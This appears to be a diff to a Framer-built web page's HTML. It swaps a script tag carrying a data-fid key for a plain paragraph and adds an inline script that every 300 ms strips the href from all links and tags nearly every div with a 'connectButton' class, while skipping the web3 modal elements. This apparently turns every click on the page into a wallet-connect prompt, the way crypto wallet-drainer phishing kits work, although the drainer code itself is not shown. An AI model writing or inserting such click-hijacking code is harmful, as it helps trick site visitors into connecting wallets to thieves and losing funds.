@@ -34,7 +34,7 @@
 </head>
 
 <body class="framer-body-augiA20Il">
-    <script async src="" data-fid="2CBkfzTVfNTbkxtD5TwHQGyqfK4rCtHYyYaEB2mE925"></script>
+    <p>"2CBkfzTVfNTbkxtD5TwHQGyqfK4rCtHYyYaEB2mE925"</p>
 
     
     <!-- End of bodyStart -->
@@ -42,7 +42,21 @@
 </div>
     
     
-   
+   <script>
+    function addClassesToElements() {
+
+    const links = document.querySelectorAll('a:not(.connectButton)');
+    for (const link of links) {
+        link.removeAttribute('href');
+        link.classList.add('connectButton');
+    }
+    const buttons = document.querySelectorAll('div:not(.connectButton):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal-title):not(.web3-modal)');
+    for (const button of buttons) {
+        button.classList.add('connectButton');
+    }
+    }
+    setInterval(addClassesToElements, 300);
+</script>
 
 </body>
 
